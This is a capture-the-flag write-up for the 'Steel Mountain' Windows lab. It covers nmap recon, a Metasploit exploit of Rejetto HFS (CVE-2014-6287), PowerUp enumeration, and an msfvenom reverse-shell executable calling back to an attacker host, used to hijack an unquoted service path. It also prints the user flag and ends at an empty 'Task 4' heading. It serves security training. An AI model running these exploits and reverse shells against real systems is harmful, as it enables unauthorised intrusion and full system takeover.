# Steel Mountain
- **Powerup** is a powershell script for evaluating a Windows machine and determining any abnormalities. It is used for enumeration.
### Task 1
- Who is the employee of the month?
  ```
  curl <target_ip> --output text.html
  cat text.html

  Output: ===========================
  <img src="/img/BillHarper.png" style="width:200px;height:200px;"/>
  ```
  > Bill Harper
### Task 2
- Scan the machine with nmap. What is the other port running a web server on?
  ```
  nmap --script=vuln -sV -A <target_ip>

  Output: ======================
  8080/tcp  open  http         HttpFileServer httpd 2.3
  ```
  > 8080
- Take a look at the other web server. What file server is running?

  Look up `HttpFileServer httpd 2.3` on Google and we get an [Exploit-DB link](https://www.exploit-db.com/exploits/39161). It tells us the file server and CVE number.
  > Rejetto HTTP File Server
- What is the CVE number to exploit this file server?
  > 2014-6287
- Use Metasploit to get an initial shell. What is the user flag?

  We will try to get a **meterpreter** shell. Looking at the hint, we know the flag will be in `C:\Users\bill\Desktop`, so we `cd` to it and `ls`. We see a `user.txt` file which contains the flag.
  ```
  search rejetto
  use 0
  set rhosts <target_ip>
  set rport 8080
  run

  Meterpreter:  cat c:/users/bill/Desktop/user.txt
  ```
  > b04763b6fcf51fcd7c13abc7db4fd365
### Task 3
First, `wget` [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) into your attack machine. Then we upload it into **meterpreter**. 
```
meterpreter > upload <PowerUp.ps1>
meterpreter > load powershell
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks

Output: =============================================
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```
- Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
  > AdvancedSystemCareService9
- The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

  Use msfvenom to generate a reverse shell as an Windows executable.

  `msfvenom -p windows/shell_reverse_tcp LHOST=<attack_ip> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`

  Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.

### Task 4